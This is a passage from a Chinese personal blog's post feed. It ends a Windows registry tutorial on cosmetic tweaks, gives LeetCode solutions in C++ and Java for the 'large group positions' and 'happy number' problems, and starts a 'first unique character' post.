<p>3、HKEY_LOCAL_MACHINE：存储了电脑的全部软、硬件配置信息，根键下的子键信息随系统的软、硬件配置变化而变化。</p>
<p>4、HKEY_USERS：存储了当前的用户标识、密码列表等用户信息，包括用户自定义的配置信息，如桌面背景、“开始”菜单和字体等。其中大部分的子键都可通过控制面板来进行配置。</p>
<p>5、HKEY_CURRENT_CONFIG：存储了电脑的硬件配置数据，如显示器、打印机等外设及其设置信息等。</p>
<h6 id="常用的注册表设置"><a href="#常用的注册表设置" class="headerlink" title="常用的注册表设置"></a>常用的注册表设置</h6><p><strong>1、取消快捷方式图标的箭头</strong></p>
<p>电脑中快捷方式图标只是为了区别其他系统图标或文件，没有实际意义，取消箭头符号可使桌面更美观整洁。</p>
<p>打开注册表编辑器（win+r=》输入regedit进入），展开<strong>[HKEY_CLASSES_ROOT\InternetShortcut]</strong>子键，删除右侧窗格中的IsShortcut键值项。</p>
<p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20201228115304074.png" alt="image-20201228115304074"></p>
<p><strong>2、在桌面上显示Windows版本标志</strong></p>
<p>打开注册表编辑器，展开<strong>[HKEY_CURRENT_USER\Control Panel\Desktop]</strong>子键，修改右侧窗格中PaintDesktopVersion键值项。</p>
<p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20201228115631262.png" alt="image-20201228115631262"></p>
<p><strong>3、设置窗口按钮上的文字颜色</strong></p>
<p>Windows系统的”显示 属性“对话框为用户提供了定制窗口颜色的诸多方案，但如果定义某一个部位的文字颜色就需通过注册表来实现。下面将按钮默认的黑色字体换成红色显示。</p>
<p>打开注册表编辑器，展开<strong>[HKEY_CURRENT_USER\Control Panel\Colors]</strong>子键，修改Button Text键值项的值（颜色的rgb表示）</p>
<p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20201228120041557.png" alt="image-20201228120041557"></p>
<p><strong>4、隐藏桌面</strong></p>
<p>有时候桌面应用程序多了，看起来非常的杂乱，通过修改注册表可以隐藏桌面图标</p>
<p>打开注册表编辑器，展开<strong>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]</strong>子键，新建DWORD类型键值项重命名为【NoDesktop】设置其值为1</p>
<p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20210108184237035.png" alt="image-20210108184237035"></p>
<p><strong>注：</strong></p>
<p>注册表还可以实现其他很多功能，比如”开机显示欢迎窗口“、”设置个性化问候语”等等，鉴于日常很少使用，就不再一 一介绍了。</p>
]]></content>
      <categories>
        <category>计算机科普</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>较大分组的位置</title>
    <url>/2021/01/05/%E8%BE%83%E5%A4%A7%E5%88%86%E7%BB%84%E7%9A%84%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/positions-of-large-groups/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在一个由小写字母构成的字符串 <code>s</code> 中，包含由一些连续的相同字符所构成的分组。</p>
<p>例如，在字符串 <code>s = &quot;abbxxxxzyy&quot;</code> 中，就含有 <code>&quot;a&quot;</code>, <code>&quot;bb&quot;</code>, <code>&quot;xxxx&quot;</code>, <code>&quot;z&quot;</code> 和 <code>&quot;yy&quot;</code> 这样的一些分组。</p>
<p>分组可以用区间 <code>[start, end]</code> 表示，其中 <code>start</code> 和 <code>end</code> 分别表示该分组的起始和终止位置的下标。上例中的 <code>&quot;xxxx&quot;</code> 分组用区间表示为 <code>[3,6]</code> 。</p>
<p>我们称所有包含大于或等于三个连续字符的分组为 较大分组 。</p>
<p>找到每一个 较大分组 的区间，按起始位置下标递增顺序排序后，返回结果。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abbxxxxzzy&quot;</span><br><span class="line">输出：[[3,6]]</span><br><span class="line">解释：&quot;xxxx&quot; 是一个起始于 3 且终止于 6 的较大分组。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abc&quot;</span><br><span class="line">输出：[]</span><br><span class="line">解释：&quot;a&quot;,&quot;b&quot; 和 &quot;c&quot; 均不是符合要求的较大分组。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abcdddeeeeaabbbcd&quot;</span><br><span class="line">输出：[[3,5],[6,9],[12,14]]</span><br><span class="line">解释：较大分组为 &quot;ddd&quot;, &quot;eeee&quot; 和 &quot;bbb&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aba&quot;</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> 仅含小写英文字母</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，统计每次连续字符出现的次数若大于等于三次则存储索引到vector数组中。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败46.55%，内存消耗7.8M，击败11.37%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">largeGroupPositions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span> tmp=s[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//给字符串加上辅助字符1，为了解决因为字符串结束而遗漏连续字符。</span></span><br><span class="line">        s+=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp==s[i])&#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">3</span>)&#123;</span><br><span class="line">                    v.emplace_back(i-num);</span><br><span class="line">                    v.emplace_back(i<span class="number">-1</span>);</span><br><span class="line">                    result.emplace_back(v);</span><br><span class="line">                    v.clear();</span><br><span class="line">                &#125;</span><br><span class="line">                num=<span class="number">1</span>;</span><br><span class="line">                tmp=s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/positions-of-large-groups/solution/jiao-da-fen-zu-de-wei-zhi-by-leetcode-so-fi3n/">官方题解</a>:</h6><p><strong>方法一：一次遍历</strong><br><strong>思路及解法</strong></p>
<p>我们可以遍历该序列，并记录当前分组的长度。如果下一个字符与当前字符不同，或者已经枚举到字符串尾部，就说明当前字符为当前分组的尾部。每次找到当前分组的尾部时，如果该分组长度达到 3，我们就将其加入答案。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败46.55%，内存消耗7.6M，击败46.77%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">largeGroupPositions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ret;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == n - <span class="number">1</span> || s[i] != s[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                    ret.push_back(&#123;i - num + <span class="number">1</span>, i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                num = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$是字符串的长度。我们只需要遍历一次该数组。</p>
</li>
<li><p>空间复杂度：$O(1)$。我们只需要常数的空间来保存若干变量，注意返回值不计入空间复杂度。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的方法一样，不过官方题解代码思路更清晰，某些细节比我的要好，比如连续字符终止条件和结果数组的存储，值得学习。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>快乐数</title>
    <url>/2021/01/06/%E5%BF%AB%E4%B9%90%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/happy-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个算法来判断一个数 n 是不是快乐数。</p>
<p>「快乐数」定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是 <strong>无限循环</strong> 但始终变不到 1。如果 <strong>可以变为</strong>  1，那么这个数就是快乐数。</p>
<p>如果 n 是快乐数就返回 True ；不是，则返回 False 。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：19</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">12 + 92 &#x3D; 82</span><br><span class="line">82 + 22 &#x3D; 68</span><br><span class="line">62 + 82 &#x3D; 100</span><br><span class="line">12 + 02 + 02 &#x3D; 1</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>递归思想判断一个数是不是快乐数，如果可以化为1则返回true，如果可以化为4则返回false。4是通过非快乐数的转化过程中得到的，发现非快乐数最后都会转化为4进入死循环。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败55.47%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(n)&#123;</span><br><span class="line">                sum+=<span class="built_in">pow</span>(n%<span class="number">10</span>,<span class="number">2</span>);</span><br><span class="line">                n/=<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> isHappy(sum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/happy-number/solution/kuai-le-shu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：用 HashSet 检测循环</strong><br>我们可以先举几个例子。我们从 $7$ 开始。则下一个数字是 $49$（因为 $7^2=49$），然后下一个数字是 $97$（因为 $4^2+9^2=97$）。我们可以不断重复该的过程，直到我们得到 $1$。因为我们得到了 $1$，我们知道 $7$ 是一个快乐数，函数应该返回 true。</p>
<p><img src="/2021/01/06/%E5%BF%AB%E4%B9%90%E6%95%B0/202_fig1.png" alt="fig1"></p>
<p>再举一个例子，让我们从 $116$ 开始。通过反复通过平方和计算下一个数字，我们最终得到 5858，再继续计算之后，我们又回到 $58$。由于我们回到了一个已经计算过的数字，可以知道有一个循环，因此不可能达到 $1$。所以对于 $116$，函数应该返回 <code>false</code>。</p>
<p><img src="/2021/01/06/%E5%BF%AB%E4%B9%90%E6%95%B0/202_fig2.png" alt="fig2"></p>
<p>根据我们的探索，我们猜测会有以下三种可能。</p>
<ol>
<li>最终会得到 11。</li>
<li>最终会进入循环。</li>
<li>值会越来越大，最后接近无穷大。</li>
</ol>
<p>第三个情况比较难以检测和处理。我们怎么知道它会继续变大，而不是最终得到 11 呢？我们可以仔细想一想，每一位数的最大数字的下一位数是多少。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Digits</th>
<th style="text-align:center">Largest</th>
<th style="text-align:right">Next</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align:center">9</td>
<td style="text-align:right">81</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:center">99</td>
<td style="text-align:right">162</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:center">999</td>
<td style="text-align:right">243</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:center">9999</td>
<td style="text-align:right">324</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">9999999999999</td>
<td style="text-align:right">1053</td>
</tr>
</tbody>
</table>
</div>
<p>对于 3 位数的数字，它不可能大于 243。这意味着它要么被困在 243 以下的循环内，要么跌到 1。4 位或 4 位以上的数字在每一步都会丢失一位，直到降到 3 位为止。所以我们知道，最坏的情况下，算法可能会在 243 以下的所有数字上循环，然后回到它已经到过的一个循环或者回到 1。但它不会无限期地进行下去，所以我们排除第三种选择。</p>
<p>即使在代码中你不需要处理第三种情况，你仍然需要理解为什么它永远不会发生，这样你就可以证明为什么你不处理它。</p>
<p><strong>算法：</strong></p>
<p>算法分为两部分，我们需要设计和编写代码。</p>
<ol>
<li>给一个数字 n，它的下一个数字是什么？</li>
<li>按照一系列的数字来判断我们是否进入了一个循环。</li>
</ol>
<p>第 1 部分我们按照题目的要求做数位分离，求平方和。</p>
<p>第 2 部分可以使用 HashSet 完成。每次生成链中的下一个数字时，我们都会检查它是否已经在 HashSet 中。</p>
<ul>
<li>如果它不在 HashSet 中，我们应该添加它。</li>
<li>如果它在 HashSet 中，这意味着我们处于一个循环中，因此应该返回 false。</li>
</ul>
<p>我们使用 HashSet 而不是向量、列表或数组的原因是因为我们反复检查其中是否存在某数字。检查数字是否在哈希集中需要 $O(1)$ 的时间，而对于其他数据结构，则需要$O(n)$ 的时间。选择正确的数据结构是解决这些问题的关键部分。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> totalSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> d = n % <span class="number">10</span>;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">            totalSum += d * d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> totalSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; seen = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">1</span> &amp;&amp; !seen.contains(n)) &#123;</span><br><span class="line">            seen.add(n);</span><br><span class="line">            n = getNext(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>确定这个问题的时间复杂度对于一个 “简单” 级别的问题来说是一个挑战。如果您对这些问题还不熟悉，可以尝试只计算 <code>getNext(n)</code> 函数的时间复杂度。</p>
<ul>
<li><p>时间复杂度：$O(243⋅3+logn+loglogn+logloglogn)… = O(\log n)$。</p>
<ul>
<li><p>查找给定数字的下一个值的成本为 $O(\log n)$，因为我们正在处理数字中的每位数字，而数字中的位数由 $\log n$给定。</p>
</li>
<li><p>要计算出总的时间复杂度，我们需要仔细考虑循环中有多少个数字，它们有多大。</p>
</li>
<li>我们在上面确定，一旦一个数字低于 243，它就不可能回到 243 以上。因此，我们就可以用 243243 以下最长循环的长度来代替 243，不过，因为常数无论如何都无关紧要，所以我们不会担心它。</li>
<li>对于高于 243的 n，我们需要考虑循环中每个数高于 243 的成本。通过数学运算，我们可以证明在最坏的情况下，这些成本将是 $O(\log n) + O(\log \log n) + O(\log \log \log n)…$。幸运的是，$O(\log n)$是占主导地位的部分，而其他部分相比之下都很小（总的来说，它们的总和小于$\log n$），所以我们可以忽略它们。</li>
</ul>
</li>
<li><p>空间复杂度：$O(\log n)$。与时间复杂度密切相关的是衡量我们放入 HashSet 中的数字以及它们有多大的指标。对于足够大的 n，大部分空间将由 n 本身占用。我们可以很容易地优化到 $O(243 \cdot 3) = O(1)$，方法是只保存集合中小于 243 的数字，因为对于较高的数字，无论如何都不可能返回到它们。</p>
</li>
</ul>
<p><strong>方法二：快慢指针法</strong><br>通过反复调用 <code>getNext(n)</code> 得到的链是一个隐式的链表。隐式意味着我们没有实际的链表节点和指针，但数据仍然形成链表结构。起始数字是链表的头 “节点”，链中的所有其他数字都是节点。next 指针是通过调用 <code>getNext(n)</code> 函数获得。</p>
<p>意识到我们实际有个链表，那么这个问题就可以转换为检测一个链表是否有环。因此我们在这里可以使用弗洛伊德循环查找算法。这个算法是两个奔跑选手，一个跑的快，一个跑得慢。在龟兔赛跑的寓言中，跑的快的称为 “乌龟”，跑得快的称为 “兔子”。</p>
<p>不管乌龟和兔子在循环中从哪里开始，它们最终都会相遇。这是因为兔子每走一步就向乌龟靠近一个节点（在它们的移动方向上）。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/202/2.jpg" alt="img"></p>
<p><strong>算法：</strong></p>
<p>我们不是只跟踪链表中的一个值，而是跟踪两个值，称为快跑者和慢跑者。在算法的每一步中，慢速在链表中前进 1 个节点，快跑者前进 2 个节点（对 <code>getNext(n)</code> 函数的嵌套调用）。</p>
<p>如果 <code>n</code> 是一个快乐数，即没有循环，那么快跑者最终会比慢跑者先到达数字 1。</p>
<p>如果 <code>n</code> 不是一个快乐的数字，那么最终快跑者和慢跑者将在同一个数字上相遇。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> totalSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> d = n % <span class="number">10</span>;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">            totalSum += d * d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> totalSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slowRunner = n;</span><br><span class="line">        <span class="keyword">int</span> fastRunner = getNext(n);</span><br><span class="line">        <span class="keyword">while</span> (fastRunner != <span class="number">1</span> &amp;&amp; slowRunner != fastRunner) &#123;</span><br><span class="line">            slowRunner = getNext(slowRunner);</span><br><span class="line">            fastRunner = getNext(getNext(fastRunner));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fastRunner == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(\log n)$。该分析建立在对前一种方法的分析的基础上，但是这次我们需要跟踪两个指针而不是一个指针来分析，以及在它们相遇前需要绕着这个循环走多少次。</p>
<ul>
<li><p>如果没有循环，那么快跑者将先到达 1，慢跑者将到达链表中的一半。我们知道最坏的情况下，成本是 $O(2 \cdot \log n) = O(\log n)$。</p>
</li>
<li><p>一旦两个指针都在循环中，在每个循环中，快跑者将离慢跑者更近一步。一旦快跑者落后慢跑者一步，他们就会在下一步相遇。假设循环中有 k 个数字。如果他们的起点是相隔 k-1 的位置（这是他们可以开始的最远的距离），那么快跑者需要 k-1 步才能到达慢跑者，这对于我们的目的来说也是不变的。因此，主操作仍然在计算起始 n 的下一个值，即 $O(\log n)$。</p>
</li>
</ul>
</li>
<li><p>空间复杂度：$O(1)$，对于这种方法，我们不需要哈希集来检测循环。指针需要常数的额外空间。</p>
</li>
</ul>
<p><strong>方法三：数学</strong></p>
<p>前两种方法是你在面试中应该想到的。第三种方法不是你在面试中会写的，而是针对对数学好奇的人，因为它很有趣。</p>
<p>下一个值可能比自己大的最大数字是什么？根据我们之前的分析，我们知道它必须低于 243。因此，我们知道任何循环都必须包含小于 243 的数字，用这么小的数字，编写一个能找到所有周期的强力程序并不困难。</p>
<p>如果这样做，您会发现只有一个循环：$4 \rightarrow 16 \rightarrow 37 \rightarrow 58 \rightarrow 89 \rightarrow 145 \rightarrow 42 \rightarrow 20 \rightarrow 4$。所有其他数字都在进入这个循环的链上，或者在进入 1 的链上。</p>
<p>因此，我们可以硬编码一个包含这些数字的散列集，如果我们达到其中一个数字，那么我们就知道在循环中。</p>
<p><strong>算法：</strong></p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Set&lt;Integer&gt; cycleMembers =</span><br><span class="line">        <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(<span class="number">4</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">58</span>, <span class="number">89</span>, <span class="number">145</span>, <span class="number">42</span>, <span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNext</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> totalSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> d = n % <span class="number">10</span>;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">            totalSum += d * d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> totalSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">1</span> &amp;&amp; !cycleMembers.contains(n)) &#123;</span><br><span class="line">            n = getNext(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(\log n)$。和上面一样。</li>
<li>空间复杂度：$O(1)$，我们没有保留我们所遇到的数字的历史记录。硬编码哈希集的大小是固定的。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解第一种方法比较好想，考虑到更加简单我采用了第三种方法，最后只有一个循环这也是我尝试之后得出的，想给出数学证明但是没想到怎么写，官方题解指出可以找出所有周期最后发现只有一个循环，也是一种方法。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>第一个只出现一次的字符</title>
    <url>/2021/01/08/%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在字符串 s 中找出第一个只出现一次的字符。如果没有，返回一个单空格。 s 只包含小写字母。</p>
<a id="more"></a>
